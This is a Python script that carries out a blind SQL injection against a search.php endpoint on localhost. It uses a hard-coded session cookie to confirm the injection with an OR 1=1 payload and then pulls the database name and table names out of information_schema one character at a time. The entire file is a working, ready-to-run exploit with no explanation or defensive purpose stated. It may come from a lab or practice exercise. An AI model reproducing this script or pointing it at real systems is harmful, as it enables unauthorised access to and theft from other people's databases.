import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

print("Starting extraction...")

try:
    # Test basic injection
    r = requests.post(URL, data={"username": "' OR 1=1-- "}, cookies=COOKIES, timeout=3)
    if "No results" not in r.text:
        print("[+] SQL injection confirmed")
    
    # Function to test query
    def test(payload):
        try:
            resp = requests.post(URL, data={"username": payload}, cookies=COOKIES, timeout=2)
            return "No results" not in resp.text
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    # Extract database name - optimized character search
    print("\nExtracting database name...")
    db = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    
    for pos in range(1, 15):
        found = False
        for c in charset:
            payload = f"' AND SUBSTRING(database(),{pos},1)='{c}'-- "
            if test(payload):
                db += c
                print(f"  Pos {pos}: '{c}' -> {db}")
                found = True
                break
        if not found:
            break
    
    print(f"\n[+] Database: {db}")
    
    # Get table names
    print("\nExtracting tables...")
    tables = []
    for i in range(3):
        table = ""
        for pos in range(1, 20):
            found = False
            for c in charset:
                query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i},1"
                payload = f"' AND SUBSTRING(({query}),{pos},1)='{c}'-- "
                if test(payload):
                    table += c
                    found = True
                    break
            if not found:
                break
        if table:
            tables.append(table)
            print(f"  Table {i+1}: {table}")
    
    print(f"\n[+] Tables: {tables}")
    
except Exception as e:
    print(f"Exception: {e}")
    import traceback
    traceback.print_exc()

print("\nDone!")

